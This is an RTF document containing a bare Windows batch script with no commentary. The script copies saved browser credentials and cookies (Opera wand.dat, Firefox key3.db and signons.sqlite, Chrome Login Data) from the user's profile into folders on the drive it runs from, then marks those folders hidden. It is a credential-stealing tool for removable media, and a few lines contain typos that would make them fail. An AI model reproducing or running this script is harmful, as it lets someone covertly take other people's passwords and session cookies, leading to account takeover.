{\rtf1\ansi\ansicpg1251\cocoartf1561\cocoasubrtf400
{\fonttbl\f0\fnil\fcharset0 Georgia;\f1\fmodern\fcharset0 Courier;}
{\colortbl;\red255\green255\blue255;\red49\green49\blue49;\red255\green255\blue255;}
{\*\expandedcolortbl;;\cssrgb\c25098\c25098\c25098;\cssrgb\c100000\c100000\c100000;}
\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab720
\pard\pardeftab720\partightenfactor0

\f0\fs26\fsmilli13333 \cf2 \cb3 \expnd0\expndtw0\kerning0
@echo off
\f1\fs32 \

\f0\fs26\fsmilli13333 md %~d0\\Mozilla
\f1\fs32 \

\f0\fs26\fsmilli13333 md %~d0\\Opera
\f1\fs32 \

\f0\fs26\fsmilli13333 md %~d0\\Google
\f1\fs32 \

\f0\fs26\fsmilli13333 CD/D %APPDATA%\\Opera\\Opera\\
\f1\fs32 \

\f0\fs26\fsmilli13333 copy /y wand.dat %~d0\\Opera\\
\f1\fs32 \

\f0\fs26\fsmilli13333 copy /y coockies.dat %~d0\\Opera\\
\f1\fs32 \

\f0\fs26\fsmilli13333 cd %AppData%\\Mozilla\\Firefox\\Profiles\\*.def-ault
\f1\fs32 \

\f0\fs26\fsmilli13333 copy /y coockies.sqlite %~d0\\Mozilla
\f1\fs32 \

\f0\fs26\fsmilli13333 copy /y key3.db %~d0\\Mozilla
\f1\fs32 \

\f0\fs26\fsmilli13333 copy /y signons.sqlite %~d0\\Mozilla
\f1\fs32 \

\f0\fs26\fsmilli13333 copy /y AppData%\\Mozilla\\Firefox\\Profiles\\*.def-ault %~d0\\Mozilla
\f1\fs32 \

\f0\fs26\fsmilli13333 cd %localappdata%\\Google\\Chrome\\User Data\\Default
\f1\fs32 \

\f0\fs26\fsmilli13333 copy /y "%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data" "%~d0/Google"
\f1\fs32 \

\f0\fs26\fsmilli13333 ATTRIB -R -A -S -H
\f1\fs32 \

\f0\fs26\fsmilli13333 attrib +h %~d0\\Mozilla
\f1\fs32 \

\f0\fs26\fsmilli13333 attrib +h %~d0\\Opera
\f1\fs32 \

\f0\fs26\fsmilli13333 attrib +h %~d0\\Google}